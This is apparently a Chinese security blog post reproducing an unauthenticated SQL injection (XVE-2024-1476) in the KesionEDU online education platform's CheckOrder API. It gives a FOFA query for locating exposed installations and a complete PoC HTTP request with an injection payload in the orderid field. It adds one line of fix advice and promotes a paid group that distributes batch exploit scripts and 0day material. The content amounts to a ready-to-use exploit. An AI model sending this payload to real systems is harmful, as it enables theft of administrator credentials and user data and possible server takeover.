#  「漏洞复现」科汛新职教网校系统KesionEDU CheckOrder SQL注入漏洞(XVE-2024-1476)   
冷漠安全  冷漠安全   2024-12-29 10:20  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
科汛新职教网校系统KesionEDU是KESION科汛开发的在线教育建站系统，支持在线直播教学、课程点播、录播授课等多种教学方式，满足不同场景下的教学需求。提供问答互动、学习点评、在线笔记等功能，增强学员与教师之间的互动交流。拥有在线考试系统，支持单选、多选、问答等多种题型，方便学员进行课后测练和考试。供求职招聘功能，方便教育机构网罗各地人才，增强平台吸引力。提供全方位的技术支持和售后服务，确保教育机构在使用过程中无后顾之忧。是教育机构搭建在线教育平台的理想选择。  
  
0x03  
  
漏洞威胁  
  
科汛新职教网校系统KesionEDU CheckOrder 接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。  
  
影响范围：  
  
version <= V10.231120  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
body="/KS_Inc/static/edu"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oFJlXibukODN1QVy7weAlYJsNTI6RdoBefIjy7CKqpZLEfSae7I3DY23glzYe496IMQUwABic0HnrA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
POST /webapi/APP/CheckOrder HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: application/json, text/javascript, */*; q=0.01
Priority: u=0
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest

{"orderid":"1' AND 7755 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (7755=7755) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113)))-- Ahbw","apptoken":"1","ordertype":"1"}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oFJlXibukODN1QVy7weAlYJvx91KTgiaosojCXwicq4esmDAPBmhDlj4o5GJciclFRvYxtU1iafxlMib2A/640?wx_fmt=png&from=appmsg "")  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oFJlXibukODN1QVy7weAlYJLJbKn3BpZQtsz2CzghiaiaQueribdykf2L8TS2I2CSFz6GJqjgPfRdXdw/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本   
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oFJlXibukODN1QVy7weAlYJlR6hqvIhrQlcSqvdBzFDDdTGFVbsAsnPxZJC8nY9jVD2tayTmEicSog/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0oFJlXibukODN1QVy7weAlYJA7YDSFiaCG5KShuolicQ01cRFXXeL21xKCycBtTwLyWZT9N4LtibTFzJg/640?wx_fmt=gif&from=appmsg "")  
  
  
